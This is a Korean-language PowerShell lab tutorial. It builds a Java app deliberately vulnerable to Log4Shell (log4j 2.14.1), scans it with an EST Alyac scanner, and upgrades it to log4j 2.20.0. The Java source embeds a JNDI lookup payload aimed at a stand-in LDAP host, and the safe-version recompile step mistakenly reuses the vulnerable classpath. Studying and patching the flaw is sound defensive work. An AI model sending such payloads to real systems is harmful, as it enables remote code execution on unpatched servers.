# **\[Log4j 취약점 확인 및 패치]**

운영체제 : Windows 11 pro / 사용도구 : Windows PowerShell

Java 환경 : openjdk version "1.8.0\_442"

스캐너 : 이스프소프트, Alyaclog4jscanner\_x64.exe

---



1. ###### **OpenJDK 8 설치**

\# Chocolatey 설치 (관리자 권한 필요)

Set-ExecutionPolicy Bypass -Scope Process -Force

\[System.Net.ServicePointManager]::SecurityProtocol = \[System.Net.ServicePointManager]::SecurityProtocol -bor 3072

iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))



\# OpenJDK 8 설치

choco install openjdk8 -y



\# 환경변수 확인

java -version



###### **2. 작업 디렉토리 및 취약한 Log4j 라이브러리 다운로드**

\# 작업 디렉토리 생성

$workDir = "C:\\log4j-lab"

New-Item -ItemType Directory -Path $workDir -Force

Set-Location $workDir



\# 취약한 log4j 라이브러리 다운로드 (2.14.1 - CVE-2021-44228 취약)

$log4jVulnUrl = "https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-core/2.14.1/log4j-core-2.14.1.jar"

$log4jApiUrl = "https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-api/2.14.1/log4j-api-2.14.1.jar"



\# 라이브러리 디렉토리 생성

New-Item -ItemType Directory -Path "$workDir\\lib" -Force



\# 취약한 버전 다운로드

Invoke-WebRequest -Uri $log4jVulnUrl -OutFile "$workDir\\lib\\log4j-core-2.14.1.jar"

Invoke-WebRequest -Uri $log4jApiUrl -OutFile "$workDir\\lib\\log4j-api-2.14.1.jar"



Write-Host "취약한 log4j 라이브러리 다운로드 완료!" -ForegroundColor Green



###### **3단계: 취약한 Java 애플리케이션 작성**

\# Java 소스 파일 생성

$javaSource = @"

import org.apache.logging.log4j.LogManager;

import org.apache.logging.log4j.Logger;



public class VulnerableApp {

    private static final Logger logger = LogManager.getLogger(VulnerableApp.class);

 

    public static void main(String\[] args) {

        System.out.println("=== Log4j 취약점 테스트 애플리케이션 ===");

 

        // 일반 로그

        logger.info("애플리케이션 시작");

 

        // 취약한 입력 (실제 공격 코드는 아님)

        String userInput = "`${jndi:ldap://malicious.example.com:1389/payload}";

        logger.info("사용자 입력: " + userInput);

 

        // 시스템 정보 로깅

        logger.info("Java 버전: " + System.getProperty("java.version"));

        logger.info("OS: " + System.getProperty("os.name"));

 

        System.out.println("로그 출력 완료. 로그 파일을 확인하세요.");

    }

}

"@



\# 소스 파일 저장

$javaSource | Out-File -FilePath "$workDir\\VulnerableApp.java" -Encoding UTF8



\# log4j2.xml 설정 파일 생성

$log4jConfig = @"

<?xml version="1.0" encoding="UTF-8"?>

<Configuration status="WARN">

    <Appenders>

        <Console name="Console" target="SYSTEM\\\\\\\_OUT">

            <PatternLayout pattern="%d{HH:mm:ss.SSS} \\\\\\\[%t] %-5level %logger{36} - %msg%n"/>

        </Console>

        <File name="File" fileName="app.log">

            <PatternLayout pattern="%d{yyyy-MM-dd HH:mm:ss.SSS} \\\\\\\[%t] %-5level %logger{36} - %msg%n"/>

        </File>

    </Appenders>

    <Loggers>

        <Root level="info">

            <AppenderRef ref="Console"/>

            <AppenderRef ref="File"/>

        </Root>

    </Loggers>

</Configuration>

"@



$log4jConfig | Out-File -FilePath "$workDir\\log4j2.xml" -Encoding UTF8



Write-Host "Java 애플리케이션 소스 파일 생성 완료!" -ForegroundColor Green



###### **4단계: 애플리케이션 컴파일 및 실행**

\# 작업 디렉터리 설정

$workDir = "C:\\log4j-lab"



\# 클래스패스 설정 (lib 디렉토리 내 모든 JAR 포함 + 현재 디렉터리 포함)

$classpath = "$workDir\\lib\\\*;$workDir"



\# 소스 파일 경로

$sourceFile = "$workDir\\VulnerableApp.java"



\# 현재 디렉터리 이동

Set-Location $workDir



\# 자바 파일 컴파일

javac -encoding UTF-8 -cp $classpath $sourceFile



\# 컴파일 결과 확인 후 실행

if ($LASTEXITCODE -eq 0) {

    Write-Host "✅ 컴파일 성공!" -ForegroundColor Green



    Write-Host "🚀 취약한 애플리케이션 실행 중..." -ForegroundColor Yellow



    java -cp $classpath VulnerableApp



    Write-Host "`n📄 실행 완료! app.log 파일을 확인하세요." -ForegroundColor Green

} else {

    Write-Host "❌ 컴파일 실패!" -ForegroundColor Red

}



###### **5단계: Log4j 스캐너 다운로드 및 실행**

 - 이스트소프트 알약 스캐너 활용

 - https://www.estsecurity.com/enterprise/security-center/download



###### **6단계: 안전한 버전으로 업데이트**

\# 안전한 log4j 버전 다운로드 (2.17.0 이상)

$safeLog4jCoreUrl = "https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-core/2.20.0/log4j-core-2.20.0.jar"

$safeLog4jApiUrl = "https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-api/2.20.0/log4j-api-2.20.0.jar"



\# 안전한 버전 디렉토리 생성

New-Item -ItemType Directory -Path "$workDir\\lib-safe" -Force



\# 안전한 버전 다운로드

Write-Host "안전한 log4j 버전 다운로드 중..." -ForegroundColor Yellow

Invoke-WebRequest -Uri $safeLog4jCoreUrl -OutFile "$workDir\\lib-safe\\log4j-core-2.20.0.jar"

Invoke-WebRequest -Uri $safeLog4jApiUrl -OutFile "$workDir\\lib-safe\\log4j-api-2.20.0.jar"



Write-Host "안전한 log4j 라이브러리 다운로드 완료!" -ForegroundColor Green



\# 안전한 버전으로 다시 컴파일 및 실행

$safeClasspath = "$workDir\\lib-safe\\\*;$workDir"



Write-Host "안전한 버전으로 다시 컴파일 중..." -ForegroundColor Yellow

javac -encoding UTF-8 -cp $classpath VulnerableApp.java



if ($LASTEXITCODE -eq 0) {

    Write-Host "안전한 버전 컴파일 성공!" -ForegroundColor Green

 

    # 안전한 버전 실행

    java -cp $safeClasspath VulnerableApp

}



###### **7. Log4j 스캐너 재실행 후 안전한 버전 확인**

 - powershell -Command "\& 'C:\\Users\\Richard\\Desktop\\AlyacLog4jScanner\_Windows\_x64\\AlyacLog4jScanner\_Windows\_x64.exe' 'C:\\log4j-lab\\lib-safe' \*> 'C:\\log4j-lab\\scan\_log.txt'"



여기까지 '취약하고 오래된 구성요소 취약점'을 스캔하고, 업데이트하는 방법을 알아보았습니다. 감사합니다.!

